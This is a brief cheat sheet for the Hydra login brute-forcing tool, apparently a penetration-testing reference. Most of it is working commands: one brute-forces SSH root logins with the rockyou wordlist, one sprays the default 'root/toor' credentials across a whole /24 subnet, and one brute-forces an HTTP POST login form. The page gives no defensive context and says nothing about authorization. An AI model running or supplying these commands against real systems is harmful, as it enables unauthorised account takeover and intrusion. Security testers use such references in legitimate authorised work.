# Hydra

## Documentation

* [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

## Common Options

* \-l : username
* \-P : wordlist

## Examples

### SSH

#### Bruteforcing user on a single host

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -e nsr ssh
```

#### Spraying across a network

```
hydra -l root -p toor 10.0.0.0/24 ssh
```

### HTTP POST

```
hydra 10.0.0.1 http-form-post "/action.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```
